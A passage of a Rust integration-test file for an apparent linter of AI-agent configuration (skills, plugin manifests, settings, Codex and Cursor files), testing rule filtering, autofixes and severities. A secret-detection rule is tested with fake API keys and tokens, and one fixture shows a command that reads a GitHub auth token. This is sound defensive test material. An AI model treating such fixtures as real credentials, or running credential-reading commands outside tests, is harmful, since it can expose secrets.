        &["--format", "json", "--only", "A029,Q005", "."],
    );
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    let report = json(&output);
    assert_eq!(report["diagnostics"], serde_json::json!([]));
}

#[test]
fn emphasized_a029_control_and_q005_label_work_through_the_real_binary() {
    let clean = tempfile::tempdir().unwrap();
    init_git(clean.path());
    std::fs::create_dir_all(clean.path().join(".claude/agents")).unwrap();
    std::fs::write(
        clean.path().join(".claude/agents/reviewer.md"),
        "---\nname: reviewer\ndescription: Reviews changes and makes targeted repairs when needed\ntools: Bash\n---\n**Stop after 3 attempts and report the blocker.**\n",
    )
    .unwrap();
    let clean_output = run_in(
        clean.path(),
        &["--format", "json", "--only", "A029,Q005", "."],
    );
    assert!(
        clean_output.status.success(),
        "stderr: {}",
        stderr(&clean_output)
    );
    assert_eq!(json(&clean_output)["diagnostics"], serde_json::json!([]));

    let broken = tempfile::tempdir().unwrap();
    init_git(broken.path());
    std::fs::create_dir(broken.path().join(".claude")).unwrap();
    std::fs::write(
        broken.path().join("CLAUDE.md"),
        "**Important**: keep retrying until the build passes.\n",
    )
    .unwrap();
    let broken_output = run_in(
        broken.path(),
        &["--format", "json", "--only", "A029,Q005", "."],
    );
    assert_eq!(
        broken_output.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&broken_output)
    );
    let diagnostics = json(&broken_output)["diagnostics"]
        .as_array()
        .unwrap()
        .clone();
    assert_eq!(diagnostics.len(), 1);
    assert_eq!(diagnostics[0]["code"], "Q005");
    assert_eq!(
        diagnostics[0]["evidence"],
        "**Important**: keep retrying until the build passes."
    );
}

#[test]
fn q005_reports_wrapped_instructions_in_source_order_through_the_real_binary() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".claude")).unwrap();
    std::fs::write(
        tmp.path().join("CLAUDE.md"),
        "Retry until\nsuccess.\n\n- Keep trying until it\n  succeeds.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "Q005", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 2);
    assert_eq!(diagnostics[0]["code"], "Q005");
    assert_eq!(diagnostics[0]["location"]["start"]["line"], 1);
    assert_eq!(diagnostics[1]["code"], "Q005");
    assert_eq!(diagnostics[1]["location"]["start"]["line"], 4);
}

#[test]
fn only_excludes_unselected_rules_from_suppressed_and_unused_counts() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"hooks-test","hooks":"./config/missing.json"}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = [".claude-plugin/plugin.json"]
suppress = ["M001"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--only", "H001", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert!(stderr.contains("H001/hooks-json-missing"));
    assert!(!stderr.contains("suppressed)"));
    assert!(!stderr.contains("unused-override"));
}

#[test]
fn only_reports_unused_overrides_for_selected_rule_entries() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"hooks-test","hooks":"./config/missing.json"}"#,
    )
    .unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
[[lint.overrides]]
files = ["missing.md"]
suppress = ["M001", "H001"]
"#,
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--only", "H001", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert_eq!(stderr.matches("config/unused-override").count(), 1);
    assert!(stderr.contains("H001/hooks-json-missing"));
    assert!(!stderr.contains("M001/plugin-json-missing"));
}

#[test]
fn only_applies_and_validates_autofixes_for_selected_rules() {
    let tmp = tempfile::tempdir().unwrap();
    let content = write_skill(tmp.path(), "focused", "http://legacy.corp")
        .replace("name: focused", "name: wrong-name");
    let skill = tmp.path().join(".claude/skills/focused/SKILL.md");
    std::fs::write(&skill, content).unwrap();

    let output = run_in(tmp.path(), &["--autofix", "--only", "S031", "."]);
    let stderr = stderr(&output);
    assert!(output.status.success(), "stderr: {stderr}");
    let fixed = std::fs::read_to_string(skill).unwrap();
    assert!(fixed.contains("https://legacy.corp"), "content: {fixed}");
    assert!(fixed.contains("name: wrong-name"), "content: {fixed}");
    assert!(!stderr.contains("S006/frontmatter-name-mismatch"));
}

#[test]
fn s031_autofix_rewrites_claude_surfaces_only() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let http_body = "---\nname: leaky\ndescription: A valid skill description here\n---\nFetch from http://api.corp/x\n";
    for relative in [
        ".claude/skills/leaky/SKILL.md",
        ".agents/skills/leaky/SKILL.md",
        ".cursor/skills/leaky/SKILL.md",
    ] {
        let path = tmp.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, http_body).unwrap();
    }

    let output = run_in(
        tmp.path(),
        &["--autofix", "--format", "json", "--only", "S031", "."],
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(
        stderr(&output).contains("fixed[S031/non-https-url]"),
        "stderr: {}",
        stderr(&output)
    );
    let report = json_document(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    let mut subjects: Vec<_> = diagnostics
        .iter()
        .map(|diagnostic| diagnostic["subject_path"].as_str().unwrap())
        .collect();
    subjects.sort();
    assert_eq!(
        subjects,
        vec![
            ".agents/skills/leaky/SKILL.md",
            ".cursor/skills/leaky/SKILL.md",
        ]
    );

    let claude = std::fs::read_to_string(tmp.path().join(".claude/skills/leaky/SKILL.md")).unwrap();
    assert!(
        claude.contains("https://api.corp/x"),
        "Claude surface should be rewritten: {claude}"
    );
    for relative in [
        ".agents/skills/leaky/SKILL.md",
        ".cursor/skills/leaky/SKILL.md",
    ] {
        let content = std::fs::read_to_string(tmp.path().join(relative)).unwrap();
        assert!(
            content.contains("http://api.corp/x"),
            "{relative} must not be rewritten by S031 autofix: {content}"
        );
        assert!(!content.contains("https://api.corp/x"));
    }
}

#[test]
fn s006_autofix_matches_the_validation_mode_and_active_agent_skill_target() {
    let basic = tempfile::tempdir().unwrap();
    init_git(basic.path());
    for (relative, name) in [
        (".claude/skills/private/SKILL.md", "wrong-private"),
        ("skills/public/SKILL.md", "wrong-public"),
    ] {
        let path = basic.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            path,
            format!("---\nname: {name}\ndescription: A valid skill description\n---\nBody\n"),
        )
        .unwrap();
    }
    let private = basic.path().join(".claude/skills/private/SKILL.md");
    let public = basic.path().join("skills/public/SKILL.md");
    let first = run_in(basic.path(), &["--autofix", "--only", "S006", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));
    assert!(
        std::fs::read_to_string(&private)
            .unwrap()
            .contains("name: private")
    );
    assert!(
        std::fs::read_to_string(&public)
            .unwrap()
            .contains("name: wrong-public")
    );
    let second = run_in(basic.path(), &["--autofix", "--only", "S006", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert!(!stderr(&second).contains("fixed[S006/"));

    let plugin = tempfile::tempdir().unwrap();
    init_git(plugin.path());
    std::fs::create_dir_all(plugin.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        plugin.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"s006-fixture"}"#,
    )
    .unwrap();
    for relative in ["skills/public/SKILL.md", ".claude/skills/private/SKILL.md"] {
        let path = plugin.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            "---\nname: wrong\ndescription: A valid skill description\n---\nBody\n",
        )
        .unwrap();
    }
    let output = run_in(plugin.path(), &["--autofix", "--only", "S006", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    for relative in ["skills/public/SKILL.md", ".claude/skills/private/SKILL.md"] {
        let content = std::fs::read_to_string(plugin.path().join(relative)).unwrap();
        let expected = if relative.starts_with("skills/") {
            "name: public"
        } else {
            "name: private"
        };
        assert!(content.contains(expected), "content: {content}");
    }

    let agent_target = tempfile::tempdir().unwrap();
    init_git(agent_target.path());
    for relative in [
        ".claude/skills/private/SKILL.md",
        ".agents/skills/portable/SKILL.md",
    ] {
        let path = agent_target.path().join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            "---\nname: wrong\ndescription: A valid skill description\n---\nBody\n",
        )
        .unwrap();
    }
    let output = run_in(agent_target.path(), &["--autofix", "--only", "S006", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    for (relative, expected) in [
        (".claude/skills/private/SKILL.md", "private"),
        (".agents/skills/portable/SKILL.md", "portable"),
    ] {
        assert!(
            std::fs::read_to_string(agent_target.path().join(relative))
                .unwrap()
                .contains(&format!("name: {expected}"))
        );
    }
}

#[test]
fn s007_uses_canonical_yaml_and_never_orphans_continuations() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let hinted = tmp.path().join(".claude/skills/hinted/SKILL.md");
    let empty = tmp.path().join(".claude/skills/empty/SKILL.md");
    std::fs::create_dir_all(hinted.parent().unwrap()).unwrap();
    std::fs::create_dir_all(empty.parent().unwrap()).unwrap();
    let hinted_content = "---\nname: hinted\ndescription: Use when testing argument hint continuation lines\nargument-hint:\n  \"[issue-number]\"\n---\nBody\n";
    std::fs::write(&hinted, hinted_content).unwrap();
    std::fs::write(
        &empty,
        "---\nname: empty\ndescription: Use when testing empty optional fields\nargument-hint:\n---\nBody\n",
    )
    .unwrap();

    let first = run_in(tmp.path(), &["--autofix", "--only", "S007", "."]);
    assert!(first.status.success(), "stderr: {}", stderr(&first));
    assert_eq!(std::fs::read_to_string(&hinted).unwrap(), hinted_content);
    assert!(
        !std::fs::read_to_string(&empty)
            .unwrap()
            .contains("argument-hint:")
    );
    let second = run_in(tmp.path(), &["--autofix", "--only", "S007", "."]);
    assert!(second.status.success(), "stderr: {}", stderr(&second));
    assert!(!stderr(&second).contains("fixed[S007/"));

    let invalid = tmp.path().join(".claude/skills/invalid/SKILL.md");
    let invalid_content = "---\nname: invalid\ndescription: A valid description\nargument-hint:\n\tinvalid: yaml\n---\nBody\n";
    std::fs::create_dir_all(invalid.parent().unwrap()).unwrap();
    std::fs::write(&invalid, invalid_content).unwrap();
    let output = run_in(tmp.path(), &["--autofix", "--only", "S007", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert!(stderr(&output).contains("S007/frontmatter-field-empty"));
    assert_eq!(std::fs::read_to_string(invalid).unwrap(), invalid_content);
}

#[test]
fn s031_json_carries_line_metadata_and_url_evidence() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    // Body: line 5 `# URL handling`, line 6 blank, line 7 the URL.
    write_skill(tmp.path(), "leaky", "http://api.corp/data");

    let output = run_in(tmp.path(), &["--format", "json", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json_document(&output);
    let finding = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .find(|diagnostic| diagnostic["code"] == "S031")
        .expect("S031 diagnostic in JSON");
    assert_eq!(finding["location"]["start"]["line"], 7);
    assert_eq!(finding["evidence"], "http://api.corp/data");
    assert_eq!(
        finding["suggestion"],
        "use https:// (or remove the reference)"
    );
    assert_eq!(finding["subject_path"], ".claude/skills/leaky/SKILL.md");
}

#[test]
fn s032_scans_complete_skill_source_with_safe_structured_metadata() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/leaky/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    let committed_value = "committed-super-secret-value";
    std::fs::write(
        &skill,
        format!(
            "---\nname: leaky\ndescription: Use when testing source-positioned secret handling\ndeployment_token: {committed_value}\n---\nUse `sk-aBcDeFgHiJkLmNoPqRsT1234` only after replacing it.\n"
        ),
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "S032", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let rendered = String::from_utf8_lossy(&output.stdout);
    assert!(!rendered.contains(committed_value));
    assert!(!rendered.contains("deployment_token: committed"));
    let report = json_document(&output);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 1, "{report:#}");
    let finding = &diagnostics[0];
    assert_eq!(finding["code"], "S032");
    assert_eq!(finding["location"]["start"]["line"], 4);
    assert_eq!(finding["evidence"], "deployment_token");
    assert_eq!(
        finding["suggestion"],
        "replace the literal with an environment-variable or secret-store reference"
    );
    assert!(
        !finding["message"]
            .as_str()
            .unwrap()
            .contains(committed_value)
    );

    let clean = tmp.path().join(".claude/skills/clean/SKILL.md");
    std::fs::create_dir_all(clean.parent().unwrap()).unwrap();
    std::fs::write(
        clean,
        "---\nname: clean\ndescription: Use when documenting safe secret references\n---\npassword: \"${DB_PASSWORD}\"\nTOKEN=\"$(gh auth token)\"\nExample: `sk-xxxxxxxxxxxxxxxxxxxxxxxx`\n",
    )
    .unwrap();
    std::fs::remove_file(&skill).unwrap();
    let output = run_in(tmp.path(), &["--format", "json", "--only", "S032", "."]);
    assert!(output.status.success(), "stderr: {}", stderr(&output));
    assert!(json(&output)["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn m013_component_prefix_is_structured_and_never_autofixes() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    let manifest = tmp.path().join(".claude-plugin/plugin.json");
    let content = r#"{
  "name": "demo",
  "commands": {"bad": {"source": "commands/bad.md"}}
}"#;
    std::fs::write(&manifest, content).unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "M013", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let finding = &report["diagnostics"].as_array().unwrap()[0];
    assert_eq!(finding["code"], "M013");
    assert_eq!(finding["subject_path"], ".claude-plugin/plugin.json");
    assert_eq!(finding["location"]["start"]["line"], 3);
    assert_eq!(finding["evidence"], "commands.bad.source");
    assert_eq!(
        finding["suggestion"],
        "use a plugin-root-relative './' component path"
    );
    assert!(
        finding["message"]
            .as_str()
            .unwrap()
            .contains("must start with './'")
    );

    let output = run_in(tmp.path(), &["--autofix", "--only", "M013", "."]);
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    assert_eq!(std::fs::read_to_string(manifest).unwrap(), content);
}

#[test]
fn t001_t002_cli_preserve_fixed_path_policy_metadata_and_strictness() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude")).unwrap();
    let settings = tmp.path().join(".claude/settings.json");
    let local_settings = tmp.path().join(".claude/settings.local.json");
    let settings_content = r#"{
  "prUrlTemplate": "not-a-url/{number}?token=sk_this-value-must-not-appear",
  "channelsEnabled": false
}"#;
    std::fs::write(&settings, settings_content).unwrap();
    std::fs::write(&local_settings, r#"{"channelsEnabled":[]}"#).unwrap();
    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
exclude = [".claude/settings.json", ".claude/settings.local.json"]
"#,
    )
    .unwrap();

    let normal = run_in(
        tmp.path(),
        &["--format", "json", "--only", "T001,T002", "."],
    );
    assert!(normal.status.success(), "stderr: {}", stderr(&normal));
    let report = json(&normal);
    let diagnostics = report["diagnostics"].as_array().unwrap();
    assert_eq!(diagnostics.len(), 3);
    assert!(
        diagnostics
            .iter()
            .all(|diagnostic| diagnostic["severity"] == "warning")
    );
    assert!(
        diagnostics
            .iter()
            .all(|diagnostic| diagnostic["location"].is_object())
    );
    assert!(
        diagnostics
            .iter()
            .all(|diagnostic| diagnostic["evidence"].is_string())
    );
    assert!(
        diagnostics
            .iter()
            .all(|diagnostic| diagnostic["suggestion"].is_string())
    );
    assert_eq!(diagnostics[0]["code"], "T001");
    assert_eq!(diagnostics[0]["subject_path"], ".claude/settings.json");
    assert_eq!(
        diagnostics[0]["evidence"],
        "prUrlTemplate: invalid rendered URL"
    );
    assert_eq!(diagnostics[1]["name"], "channels-enabled-unsupported");
    assert!(
        !normal
            .stdout
            .windows(b"sk_this-value-must-not-appear".len())
            .any(|bytes| bytes == b"sk_this-value-must-not-appear")
    );

    for strictness in ["--pedantic", "--all"] {
        let output = run_in(
            tmp.path(),
            &["--format", "json", strictness, "--only", "T001,T002", "."],
        );
        assert_eq!(
            output.status.code(),
            Some(1),
            "{strictness}: {}",
            stderr(&output)
        );
        assert!(
            json(&output)["diagnostics"]
                .as_array()
                .unwrap()
                .iter()
                .all(|diagnostic| diagnostic["severity"] == "error")
        );
    }

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
        r#"[lint]
suppress = ["T001"]
[[lint.overrides]]
files = [".claude/settings.local.json"]
suppress = ["channels-enabled-invalid"]
reason = "managed policy is tracked elsewhere"
"#,
    )
    .unwrap();
    let overridden = run_in(
        tmp.path(),
        &["--format", "json", "--only", "T001,T002", "."],
    );
    assert!(
        overridden.status.success(),
        "stderr: {}",
        stderr(&overridden)
    );
    let overridden_diagnostics = json(&overridden)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(overridden_diagnostics.len(), 1);
    assert_eq!(overridden_diagnostics[0]["code"], "T002");
    assert_eq!(
        overridden_diagnostics[0]["subject_path"],
        ".claude/settings.json"
    );

    let before = std::fs::read_to_string(&settings).unwrap();
    let autofix = run_in(tmp.path(), &["--autofix", "--only", "T001,T002", "."]);
    assert!(autofix.status.success(), "stderr: {}", stderr(&autofix));
    assert_eq!(std::fs::read_to_string(&settings).unwrap(), before);

    std::fs::write(&settings, "{").unwrap();
    let invalid = run_in(
        tmp.path(),
        &["--format", "json", "--only", "H006,T001,T002", "."],
    );
    assert_eq!(
        invalid.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&invalid)
    );
    let invalid_diagnostics = json(&invalid)["diagnostics"].as_array().unwrap().clone();
    assert_eq!(invalid_diagnostics.len(), 1);
    assert_eq!(invalid_diagnostics[0]["code"], "H006");
}

#[test]
fn only_filters_basic_plugin_codex_and_cursor_dispatch() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::create_dir_all(tmp.path().join(".claude")).unwrap();
    std::fs::write(tmp.path().join(".claude/settings.json"), "not json").unwrap();
    std::fs::create_dir_all(tmp.path().join(".codex")).unwrap();
    std::fs::write(tmp.path().join(".codex/config.toml"), "not = [valid").unwrap();
    std::fs::create_dir_all(tmp.path().join(".cursor/rules")).unwrap();
    std::fs::write(tmp.path().join(".cursor/rules/empty.mdc"), "").unwrap();

    let output = run_in(tmp.path(), &["--only", "CU001,CX001,H006,M001", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    for identifier in [
        "M001/plugin-json-missing",
        "H006/settings-json-invalid",
        "CX001/codex-toml-invalid",
        "CU001/cursor-rule-empty",
    ] {
        assert!(
            stderr.contains(identifier),
            "missing {identifier}: {stderr}"
        );
    }
    let positions =
        ["M001/", "H006/", "CX001/", "CU001/"].map(|identifier| stderr.find(identifier).unwrap());
    assert!(positions.windows(2).all(|pair| pair[0] < pair[1]));
}

#[test]
fn s018_autofix_rewrites_only_single_line_canonical_descriptions() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let single = tmp.path().join(".claude/skills/single/SKILL.md");
    let block = tmp.path().join(".claude/skills/block/SKILL.md");
    std::fs::create_dir_all(single.parent().unwrap()).unwrap();
    std::fs::create_dir_all(block.parent().unwrap()).unwrap();
    std::fs::write(
        &single,
        "---\nname: single\ndescription: Use when <tag> XML needs removing\n---\nRemove XML tags.\n",
    )
    .unwrap();
    let block_content = "---\nname: block\ndescription: >-\n  Use when <tag> XML appears in a multiline description\n  and must remain byte-for-byte unchanged by autofix.\n---\nRemove XML tags.\n";
    std::fs::write(&block, block_content).unwrap();

    let first = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(first.status.code(), Some(1), "stderr: {}", stderr(&first));
    assert!(stderr(&first).contains("fixed[S018/desc-has-xml]"));
    assert!(
        !std::fs::read_to_string(&single).unwrap().contains("<tag>"),
        "single-line description should have its XML tag removed"
    );
    assert_eq!(std::fs::read_to_string(&block).unwrap(), block_content);

    let before_second = std::fs::read(&block).unwrap();
    let second = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(second.status.code(), Some(1), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read(&block).unwrap(), before_second);
    assert!(!stderr(&second).contains("fixed[S018/desc-has-xml]"));
}

#[test]
fn s016_hard_negatives_stay_clean_through_cli() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join("skills/io/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"io-plugin"}"#,
    )
    .unwrap();
    std::fs::write(
        &skill,
        "---\nname: io\ndescription: Optimize file I/O operations for large datasets, i.e. streaming reads. Use when profiling disk throughput.\n---\nTune buffered reads for large inputs.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "S016", "."]);
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    let report = json(&output);
    assert!(report["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn s016_s017_warn_normally_and_error_under_pedantic() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"severity-plugin"}"#,
    )
    .unwrap();
    let person = tmp.path().join("skills/person/SKILL.md");
    let trigger = tmp.path().join("skills/trigger/SKILL.md");
    std::fs::create_dir_all(person.parent().unwrap()).unwrap();
    std::fs::create_dir_all(trigger.parent().unwrap()).unwrap();
    std::fs::write(
        &person,
        "---\nname: person\ndescription: I can help you process uploaded files for analysis\n---\nBody content.\n",
    )
    .unwrap();
    std::fs::write(
        &trigger,
        "---\nname: trigger\ndescription: A skill that analyzes repository source trees carefully\n---\nBody content.\n",
    )
    .unwrap();

    let normal = run_in(
        tmp.path(),
        &["--format", "json", "--only", "S016,S017", "."],
    );
    assert_eq!(normal.status.code(), Some(0), "stderr: {}", stderr(&normal));
    let normal_report = json(&normal);
    let normal_severities: Vec<_> = normal_report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| (d["code"].as_str().unwrap(), d["severity"].as_str().unwrap()))
        .collect();
    assert!(normal_severities.contains(&("S016", "warning")));
    assert!(normal_severities.contains(&("S017", "warning")));

    let pedantic = run_in(
        tmp.path(),
        &["--format", "json", "--pedantic", "--only", "S016,S017", "."],
    );
    assert_eq!(
        pedantic.status.code(),
        Some(1),
        "stderr: {}",
        stderr(&pedantic)
    );
    let pedantic_report = json(&pedantic);
    let pedantic_severities: Vec<_> = pedantic_report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| (d["code"].as_str().unwrap(), d["severity"].as_str().unwrap()))
        .collect();
    assert!(pedantic_severities.contains(&("S016", "error")));
    assert!(pedantic_severities.contains(&("S017", "error")));
}

#[test]
fn s018_autofix_preserves_comparisons_and_autolinks() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/partition/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    let original = "---\nname: partition\ndescription: Partition datasets when row count < 10000 or file size > 50MB before uploading to <ops@example.com> or <https://example.com>. Use when preparing bulk imports.\n---\nPrepare bulk imports safely.\n";
    std::fs::write(&skill, original).unwrap();

    let first = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(first.status.code(), Some(0), "stderr: {}", stderr(&first));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), original);
    assert!(!stderr(&first).contains("fixed[S018/desc-has-xml]"));

    let second = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(second.status.code(), Some(0), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), original);
}

#[test]
fn s018_autofix_strips_tags_and_is_idempotent() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/tagged/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        &skill,
        "---\nname: tagged\ndescription: Use when <tag> XML needs removing from <file> paths\n---\nRemove XML tags.\n",
    )
    .unwrap();

    let first = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(first.status.code(), Some(0), "stderr: {}", stderr(&first));
    assert!(stderr(&first).contains("fixed[S018/desc-has-xml]"));
    let after = std::fs::read_to_string(&skill).unwrap();
    assert!(!after.contains("<tag>"));
    assert!(!after.contains("<file>"));
    assert!(after.contains("description: Use when"));

    let second = run_in(tmp.path(), &["--autofix", "--only", "S018", "."]);
    assert_eq!(second.status.code(), Some(0), "stderr: {}", stderr(&second));
    assert_eq!(std::fs::read_to_string(&skill).unwrap(), after);
    assert!(!stderr(&second).contains("fixed[S018/desc-has-xml]"));
}

#[test]
fn s054_changelog_evidence_clean_through_cli() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir_all(tmp.path().join(".claude-plugin")).unwrap();
    std::fs::write(
        tmp.path().join(".claude-plugin/plugin.json"),
        r#"{"name":"changelog-plugin"}"#,
    )
    .unwrap();
    let skill = tmp.path().join("skills/changelog/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        &skill,
        "---\nname: changelog\ndescription: Generates changelogs and commit summaries from git diffs. Use when releasing versions.\n---\nGenerate a changelog entry, write a commit summary for each change, analyze the git diff, and record the released version.\n",
    )
    .unwrap();

    let output = run_in(tmp.path(), &["--format", "json", "--only", "S054", "."]);
    assert_eq!(output.status.code(), Some(0), "stderr: {}", stderr(&output));
    assert!(json(&output)["diagnostics"].as_array().unwrap().is_empty());
}

#[test]
fn invalid_yaml_description_skips_description_rules_and_reports_x001() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    let skill = tmp.path().join(".claude/skills/invalid/SKILL.md");
    std::fs::create_dir_all(skill.parent().unwrap()).unwrap();
    std::fs::write(
        skill,
        "---\nname: invalid\ndescription: >-\n\tUse when <tag> you process documents\n---\nBody\n",
    )
    .unwrap();

    let output = run_in(
        tmp.path(),
        &[
            "--format",
            "json",
            "--all",
            "--only",
            "X001,S014,S015,S016,S017,S018,S034,S050,S054",
            ".",
        ],
    );
    assert_eq!(output.status.code(), Some(1), "stderr: {}", stderr(&output));
    let report = json(&output);
    let codes: Vec<_> = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|diagnostic| diagnostic["code"].as_str().unwrap())
        .collect();
    assert_eq!(codes, vec!["X001"]);
}

#[test]
fn only_filters_basic_mode_dispatch() {
    let tmp = tempfile::tempdir().unwrap();
    std::fs::create_dir(tmp.path().join(".claude")).unwrap();
    std::fs::write(tmp.path().join(".claude/settings.json"), "not json").unwrap();

    let output = run_in(tmp.path(), &["--only", "H006", "."]);
    let stderr = stderr(&output);
    assert_eq!(output.status.code(), Some(1), "stderr: {stderr}");
    assert!(stderr.contains("error[H006/settings-json-invalid]"));
    assert!(!stderr.contains("M001/plugin-json-missing"));
}

#[test]
fn codex_config_rules_honor_cli_mode_platform_policy_and_autofix_contracts() {
    let tmp = tempfile::tempdir().unwrap();
    init_git(tmp.path());
    std::fs::create_dir(tmp.path().join(".codex")).unwrap();
    let config = "model = true\nservice_tier = true\n[permissions.network]\nfuture_key = true\n";
    let config_path = tmp.path().join(".codex/config.toml");
    std::fs::write(&config_path, config).unwrap();

    let normal = run_in(
        tmp.path(),
        &["--format", "json", "--only", "CX016,CX027,CX035", "."],
    );
    assert_eq!(normal.status.code(), Some(1));
    let normal = json(&normal);
    assert_eq!(normal["mode"], "basic");
    assert!(
        normal["active_platforms"]
            .as_array()
            .unwrap()
            .contains(&Value::String("codex".into()))
    );
    assert_eq!(
        normal["diagnostics"]
            .as_array()
            .unwrap()
            .iter()
            .map(|diagnostic| (
                diagnostic["code"].as_str().unwrap(),
                diagnostic["severity"].as_str().unwrap(),
                diagnostic["subject_path"].as_str().unwrap(),
            ))
            .collect::<Vec<_>>(),
        vec![
            ("CX016", "error", ".codex/config.toml"),
            ("CX027", "error", ".codex/config.toml"),
            ("CX035", "warning", ".codex/config.toml"),
        ]
    );

    let pedantic = run_in(
        tmp.path(),
        &["--format", "json", "--pedantic", "--only", "CX035", "."],
    );
    assert_eq!(pedantic.status.code(), Some(1));
    assert_eq!(json(&pedantic)["diagnostics"][0]["severity"], "error");
    let all = run_in(
        tmp.path(),
        &["--format", "json", "--all", "--only", "CX035", "."],
    );
    assert_eq!(all.status.code(), Some(1));
    assert_eq!(json(&all)["diagnostics"][0]["severity"], "error");

    std::fs::write(
        tmp.path().join("agent-lint.toml"),
